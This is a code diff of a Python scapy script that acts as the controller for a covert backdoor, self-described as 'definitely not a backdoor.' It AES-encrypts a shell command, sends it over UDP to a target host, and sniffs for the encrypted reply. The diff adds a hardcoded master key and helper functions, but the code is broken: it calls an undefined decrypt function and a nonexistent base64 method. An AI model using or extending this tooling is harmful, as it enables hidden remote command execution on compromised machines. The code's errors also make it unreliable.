@@ -7,9 +7,22 @@ def packetFunc(packet):
   if ARP not in packet:
     print "Got a packet"
     encryptedData = packet['Raw'].load
-    data = decryptionObject.decrypt(encryptedData)
+    data = decrypt(encryptedData)
     print data
 
+MASTER_KEY = '12345678901234567890123456789012'
+
+def encrypt(thing):
+  secret = AES.new(MASTER_KEY)
+  tagString = str(thing) + (AES.block_size - len(str(thing)) % AES.block_size) * "\0"
+  cipherText = base64.base64encode(secret.encrypt(tagString))
+  return cipherText
+
+def decrypt_val(cipher_text):
+    dec_secret = AES.new(MASTER_KEY)
+    raw_decrypted = dec_secret.decrypt(base64.b64decode(cipher_text))
+    clear_val = raw_decrypted.rstrip("\0")
+    return clear_val
 
 parser = argparse.ArgumentParser(description="This is definitely not a backdoor.")
 parser.add_argument('-s'
@@ -33,7 +46,7 @@ command = "ls -l"
 sniffFilter = 'udp and dst port {0} and src port {1}' .format(args.sourcePort, args.destPort)
 encryptionObject = AES.new('This is a key123', AES.MODE_CFB, 'This is an IV456')
 decryptionObject = AES.new('This is a key123', AES.MODE_CFB, 'This is an IV456')
-encryptedCommand = encryptionObject.encrypt(command)
+encryptedCommand = encrypt(command)
 packet = IP(dst=args.destIP)/UDP(dport=int(args.destPort), sport=int(args.sourcePort))/Raw(load=encryptedCommand)
 send(packet)
 sniff(filter=sniffFilter,prn=packetFunc, count=1)
